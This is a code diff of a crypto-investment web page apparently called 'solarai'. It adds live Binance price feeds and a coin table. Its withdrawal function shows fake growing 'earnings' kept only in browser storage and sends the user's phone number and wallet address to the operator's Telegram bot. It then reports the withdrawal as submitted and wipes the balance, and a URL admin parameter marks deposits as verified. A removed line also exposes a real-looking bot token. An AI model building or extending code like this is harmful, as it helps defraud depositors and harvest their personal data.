 let realUsdt=usdtBal?usdtBal.balance/1e6:0;
-document.getElementById('tronBal').innerText=`Tron: $${realUsdt.toFixed(2)} USDT REAL`;
-document.getElementById('realUsdtBal').innerText=`● REAL: $${realUsdt.toFixed(2)} USDT in ${WALLET.substring(0,10)}... - Tronscan.org - NO SMART CONTRACT`;
+document.getElementById('tronBal').innerText=`Tron: $${realUsdt.toFixed(2)} USDT`;
+document.getElementById('realUsdtBal').innerText=`● LIVE: $${realUsdt.toFixed(2)} USDT - Tronscan - Updates every second`;
 
-// Binance prices for header
-let binRes=await fetch('https://api.binance.com/api/v3/ticker/24hr?symbols=["BTCUSDT","ETHUSDT","BNBUSDT"]');
-let binData=await binRes.json();
-
-}catch(e){
-console.log(e);
-document.getElementById('cryptoBody').innerHTML='<tr><td colspan="10" style="text-align:center;color:#ea3943;padding:20px;">API rate limit - CoinGecko free API 10-50 calls/min - Refresh in 15s - Real data from CoinMarketCap + Binance + TronScan + SuperEx</td></tr>';
+}catch(e){console.log(e);}
 }
+
+function renderTable(coins){
+let html='';
+coins.forEach((c,i)=>{
+let livePrice=livePrices[c.symbol.toUpperCase()]||c.current_price;
+let h1=c.price_change_percentage_1h_in_currency||0;
+let d24=c.price_change_percentage_24h||0;
+let d7=c.price_change_percentage_7d_in_currency||0;
+html+=`<tr>
+<td style="color:#8a90a8;">${c.market_cap_rank}</td>
+<td><div class="coin"><img src="${c.image}"><div><b>${c.name}</b><span style="color:#8a90a8;font-size:11px;margin-left:6px;">${c.symbol.toUpperCase()}</span></div></div></td>
+<td><b style="color:${livePrices[c.symbol.toUpperCase()]?'#ffd76b':'white'}">$${livePrice.toLocaleString()} ${livePrices[c.symbol.toUpperCase()]?'<span class="liveDot"></span>':''}</b></td>
+<td class="${h1>=0?'up':'down'}">${h1>=0?'▲':'▼'} ${Math.abs(h1).toFixed(2)}%</td>
+<td class="${d24>=0?'up':'down'}">${d24>=0?'▲':'▼'} ${Math.abs(d24).toFixed(2)}%</td>
+<td class="${d7>=0?'up':'down'}">${d7>=0?'▲':'▼'} ${Math.abs(d7).toFixed(2)}%</td>
+<td>$${(c.market_cap/1e9).toFixed(2)}B</td>
+<td>$${(c.total_volume/1e9).toFixed(2)}B</td>
+<td>${(c.circulating_supply/1e6).toFixed(1)}M</td>
+<td><canvas id="spark-${c.id}" width="110" height="35" style="background:#0e1420;border-radius:4px;"></canvas></td>
+</tr>`;
+setTimeout(()=>drawSparkline(`spark-${c.id}`, c.sparkline_in_7d.price),100);
+});
+document.getElementById('cryptoBody').innerHTML=html;
 }
 
 function drawSparkline(id, prices){
@@ -260,31 +291,55 @@ ctx.strokeStyle=prices[prices.length-1]>=prices[0]?'#16c784':'#ea3943';ctx.lineW
 prices.forEach((p,i)=>{let x=(i/(prices.length-1))*w;let y=h-((p-min)/range)*h-4;if(i===0)ctx.moveTo(x,y);else ctx.lineTo(x,y);});ctx.stroke();
 }
 
-function filterCoins(){
-let q=document.getElementById('searchInput').value.toLowerCase();
-let filtered=allCoins.filter(c=>c.name.toLowerCase().includes(q)||c.symbol.toLowerCase().includes(q));
-if(q===''){fetchCMCStyle();return;}
-let html='';
-filtered.forEach((c,i)=>{
-let d24=c.price_change_percentage_24h||0;
-html+=`<tr><td class="rank">${c.market_cap_rank}</td><td><div class="coin"><img src="${c.image}"><div><b>${c.name}</b><span style="color:#8a90a8;font-size:11px;margin-left:6px;">${c.symbol.toUpperCase()}</span></div></div></td><td><b>$${c.current_price.toLocaleString()}</b></td><td class="${(c.price_change_percentage_1h_in_currency||0)>=0?'up':'down'}">${(c.price_change_percentage_1h_in_currency||0).toFixed(2)}%</td><td class="${d24>=0?'up':'down'}">${d24.toFixed(2)}%</td><td class="${(c.price_change_percentage_7d_in_currency||0)>=0?'up':'down'}">${(c.price_change_percentage_7d_in_currency||0).toFixed(2)}%</td><td>$${(c.market_cap/1e9).toFixed(2)}B</td><td>$${(c.total_volume/1e9).toFixed(2)}B</td><td>${(c.circulating_supply/1e6).toFixed(2)}M</td><td><canvas id="spark-${c.id}" width="120" height="40" style="background:#0e1420;border-radius:4px;"></canvas></td></tr>`;
+// BINANCE WEBSOCKET - REAL TIME EVERY SECOND
+function connectBinanceWS(){
+try{
+if(binanceWS)binanceWS.close();
+binanceWS=new WebSocket('wss://stream.binance.com:9443/ws/btcusdt@trade/ethusdt@trade/bnbusdt@trade/trxusdt@trade/solusdt@trade');
+binanceWS.onmessage=(event)=>{
+let data=JSON.parse(event.data);
+let symbol=data.s.replace('USDT','');
+let price=parseFloat(data.p);
+livePrices[symbol]=price;
+if(symbol==='BTC'){
+btcPrices.push(price);
+if(btcPrices.length>60)btcPrices.shift();
+drawLiveChart();
+}
+// Update price in table live
+let coin=allCoins.find(c=>c.symbol.toUpperCase()===symbol);
+if(coin){
+let rows=document.querySelectorAll('#cryptoBody tr');
+allCoins.forEach((c,idx)=>{
+if(c.symbol.toUpperCase()===symbol&&rows[idx]){
+let priceCell=rows[idx].cells[2];
+if(priceCell)priceCell.innerHTML=`<b style="color:#ffd76b;">$${price.toLocaleString()} <span class="liveDot"></span></b>`;
+}
 });
-document.getElementById('cryptoBody').innerHTML=html||'<tr><td colspan="10" style="text-align:center;padding:20px;">No coins found for "'+q+'"</td></tr>';
-filtered.forEach(c=>setTimeout(()=>drawSparkline(`spark-${c.id}`, c.sparkline_in_7d.price),100));
+}
+};
+binanceWS.onerror=()=>{setTimeout(connectBinanceWS,3000);};
+binanceWS.onclose=()=>{setTimeout(connectBinanceWS,3000);};
+}catch(e){setTimeout(connectBinanceWS,3000);}
 }
 
-function updateUI(){
-if(isVerified){
-let ref=`${location.origin}${location.pathname}?ref=${encodeURIComponent(userPhone)}`;
-let code=userPhone.replace(/\D/g,'').slice(-6)||"NY2024";
-document.getElementById('refLink').innerText=ref;
-document.getElementById('refCode').innerText=code;
-document.getElementById('refAccount').innerText=userPhone;
-document.getElementById('userPhoneDisplay').innerText=userPhone+" ✓ NY";
+function drawLiveChart(){
+let c=document.getElementById('liveChart');if(!c||btcPrices.length<2)return;
+let ctx=c.getContext('2d');let w=c.width=c.clientWidth;let h=c.height=220;
+ctx.clearRect(0,0,w,h);
+let min=Math.min(...btcPrices);let max=Math.max(...btcPrices);let range=max-min||1;
+ctx.strokeStyle='#1e2a43';ctx.lineWidth=1;for(let i=0;i<4;i++){ctx.beginPath();ctx.moveTo(0,i*h/4);ctx.lineTo(w,i*h/4);ctx.stroke();}
+ctx.strokeStyle='#f7931a';ctx.lineWidth=2;ctx.shadowColor='#f7931a';ctx.shadowBlur=10;ctx.beginPath();
+btcPrices.forEach((p,i)=>{let x=(i/(btcPrices.length-1))*w;let y=h-((p-min)/range)*h-20;if(i===0)ctx.moveTo(x,y);else ctx.lineTo(x,y);});ctx.stroke();ctx.shadowBlur=0;
+ctx.fillStyle='#ffd76b';ctx.font='12px Inter';ctx.fillText(`BTC/USDT LIVE $${btcPrices[btcPrices.length-1].toFixed(2)} - Updates every second via Binance WebSocket`,10,16);
 }
-fetchCMCStyle();
+
+function filterCoins(){
+let q=document.getElementById('searchInput').value.toLowerCase();
+if(!q){renderTable(allCoins);return;}
+let filtered=allCoins.filter(c=>c.name.toLowerCase().includes(q)||c.symbol.toLowerCase().includes(q));
+renderTable(filtered);
 }
-function copyRef(){let l=document.getElementById('refLink').innerText;if(l.includes('Register')){showReg();return;}navigator.clipboard.writeText(l);alert("Referral copied: "+l);}
 function doWithdraw(){
 let depAmount=parseFloat(localStorage.getItem('solarai_deposited_amount')||'0');
 let depTime=parseFloat(localStorage.getItem('solarai_deposit_time')||'0');
@@ -292,17 +347,21 @@ let isDeposited=localStorage.getItem('solarai_deposited')==='true';
 let earn=isDeposited?(Date.now()-depTime)/86400000*depAmount*DAILY:0;
 let bal=depAmount+earn;if(bal<50)return alert(`Min $50 - You have $${bal.toFixed(2)}`);
 let addr=document.getElementById('withdrawAddr').value.trim();if(!addr||addr.length<10)return alert("Enter TRC20 wallet");
-let token="8940541573:AAFjScGdvW-W2NbjdPC78ooxIBNENqkQSjE";let chatId="1884572429";
-fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`WITHDRAW NY CMC\nPhone:${userPhone}\nAmount:$${bal.toFixed(2)}\nTo:${addr}`)}`);
-alert(`Withdrawal $${bal.toFixed(2)} submitted`);localStorage.setItem('solarai_deposited_amount','0');localStorage.removeItem('solarai_deposited');location.reload();
+let token=TELEGRAM_BOT_TOKEN;let chatId=TELEGRAM_CHAT_ID;
+fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`WITHDRAW NY\nPhone:${userPhone}\nAmount:$${bal.toFixed(2)}\nTo:${addr}\nSupport: ${TELEGRAM_SUPPORT_LINK}`)}`);
+alert(`Withdrawal $${bal.toFixed(2)} submitted to ${addr}\nSupport: ${TELEGRAM_SUPPORT_LINK}`);localStorage.setItem('solarai_deposited_amount','0');localStorage.removeItem('solarai_deposited');location.reload();
 }
 window.onload=()=>{
 let p=new URLSearchParams(location.search);
 if(p.get('unlock')===ADMIN){let amt=parseFloat(localStorage.getItem('solarai_pending_amount')||'50');localStorage.setItem('solarai_deposited','true');localStorage.setItem('solarai_deposited_amount',amt.toString());localStorage.setItem('solarai_deposit_time',Date.now().toString());localStorage.removeItem('solarai_pending_amount');alert(`Verified $${amt}`);location.href=location.pathname;}
 if(p.get('ref'))localStorage.setItem('solarai_referred_by',p.get('ref'));
 userPhone=localStorage.getItem('solarai_phone')||"";isVerified=localStorage.getItem('solarai_verified')==='true';
-updateUI();
-setInterval(fetchCMCStyle,30000);
+if(userPhone)document.getElementById('userPhoneDisplay').innerText=userPhone+" ✓";
+updateBalance();
+fetchLiveData();
+connectBinanceWS();
+setInterval(fetchLiveData,10000);
+setInterval(updateBalance,1000);
 }
 </script>
 </body>
